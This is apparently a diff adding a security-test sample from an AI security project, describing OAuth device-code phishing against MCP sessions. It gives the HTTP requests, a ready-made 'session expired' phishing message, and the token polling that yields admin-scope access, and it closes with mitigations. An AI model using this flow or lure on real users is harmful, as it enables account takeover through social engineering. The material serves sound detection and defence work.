@@ -1,0 +1,56 @@
+# DojoLM AI Security - Device Code Flow Abuse
+
+**Category:** WebMCP OAuth/Redirect Hijacking
+**Severity:** CRITICAL
+
+---
+
+An attack exploiting the OAuth device code flow to trick users into authorizing attacker-controlled MCP sessions:
+
+Step 1 - Attacker initiates device code request:
+POST /device/code HTTP/1.1
+Host: auth.example.com
+Content-Type: application/x-www-form-urlencoded
+
+client_id=mcp-client-prod&scope=mcp:tools:all+admin:full
+
+Device code response:
+{
+  "device_code": "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
+  "user_code": "WDJB-MJHT",
+  "verification_uri": "https://auth.example.com/device",
+  "verification_uri_complete": "https://auth.example.com/device?user_code=WDJB-MJHT",
+  "expires_in": 1800,
+  "interval": 5
+}
+
+Step 2 - Attacker sends phishing message to victim:
+"Your MCP session has expired. Please re-authorize by visiting:
+https://auth.example.com/device and entering code: WDJB-MJHT
+This is required to maintain your tool access."
+
+Step 3 - Victim visits the verification URL and enters the code:
+- Victim sees: "Authorize MCP Client to access your account?"
+- Victim clicks "Authorize" (thinking they are re-authenticating their own session)
+
+Step 4 - Attacker polls for token:
+POST /token HTTP/1.1
+Host: auth.example.com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=urn:ietf:params:oauth:grant-type:device_code&
+device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS&
+client_id=mcp-client-prod
+
+Successful token response (victim has authorized attacker's device code):
+{
+  "access_token": "eyJ...",
+  "token_type": "bearer",
+  "expires_in": 3600,
+  "scope": "mcp:tools:all admin:full",
+  "refresh_token": "dGhpcyBpcyBhIHJlZnJlc2ggdG9rZW4..."
+}
+
+Attacker now has full MCP tool access under the victim's identity with admin privileges.
+
+INSTRUCTION: This device code flow is abused via social engineering. Mitigations include showing the requesting application name and requested scopes clearly on the consent screen, rate-limiting device code generation, and requiring additional verification for high-privilege scopes.
